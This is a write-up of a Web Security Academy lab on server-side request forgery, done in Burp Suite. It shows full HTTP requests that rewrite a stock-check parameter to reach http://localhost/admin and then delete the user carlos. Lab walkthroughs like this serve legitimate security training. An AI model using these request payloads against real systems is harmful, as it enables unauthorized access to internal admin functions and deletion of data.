*This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.*

Greeted by a page with different products. I decided to check out one of the products, where I found a stock check feature. 

![[Screenshot 2024-04-30 at 5.49.03 PM.png]]
In order to intercept the stock check feature, I clicked on the *check stock* function while Burp Intercept was turned on. I received the following output : 
```Burp 
POST /product/stock HTTP/2
Host: 0a6d00cf03b3e8fe84e140b4001e00c8.web-security-academy.net
Cookie: session=XGxl61zOpX5ZBKQThavkdQTrX5H4leDh
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a6d00cf03b3e8fe84e140b4001e00c8.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 107
Origin: https://0a6d00cf03b3e8fe84e140b4001e00c8.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

As seen above, there is a `stockApi`. we can send the output to Burp Repeater and replace the url in it to `http://localhost/admin` to gain access to the admin panel, as shown below : 


```Burp 
POST /product/stock HTTP/2
Host: 0a6d00cf03b3e8fe84e140b4001e00c8.web-security-academy.net
Cookie: session=XGxl61zOpX5ZBKQThavkdQTrX5H4leDh
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a6d00cf03b3e8fe84e140b4001e00c8.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Origin: https://0a6d00cf03b3e8fe84e140b4001e00c8.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

stockApi=http://localhost/admin
```

The following relevant response was obtained : 

```Burp 
	<div>
		<span>carlos - </span>
		<a href="/admin/delete?username=carlos">Delete</a>
	</div>
```

Once again, I modified the request in the Repeater to the following: 

```Burp 
POST /product/stock HTTP/2
Host: 0a6d00cf03b3e8fe84e140b4001e00c8.web-security-academy.net
Cookie: session=XGxl61zOpX5ZBKQThavkdQTrX5H4leDh
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a6d00cf03b3e8fe84e140b4001e00c8.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Origin: https://0a6d00cf03b3e8fe84e140b4001e00c8.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

stockApi=http://localhost/admin/delete?username=carlos
```

This produced the following successful response : 

```Burp 
HTTP/2 302 Found
Location: /admin
Set-Cookie: session=3Mx7ydFFfCsYmfhqEghFIwooL4hkwk9N; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```
